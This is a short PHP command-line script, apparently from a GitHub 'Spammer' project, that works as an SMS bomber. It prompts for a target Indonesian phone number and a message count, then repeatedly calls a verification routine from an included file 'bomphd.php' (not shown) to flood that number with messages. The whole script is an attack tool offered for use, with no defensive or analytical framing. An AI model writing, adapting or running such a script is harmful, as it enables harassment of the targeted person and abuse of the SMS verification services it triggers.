<?php
include 'bomphd.php';

/*
    https://github.com/sontolesquad/Spammer
    Made by Muhammad Zainul Ramadhan / Mrsontolex
    Modified by Zainul Ramadhan
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "Nomor Target (pakai 62): ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "Jumlah Pesan: ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->no);
}
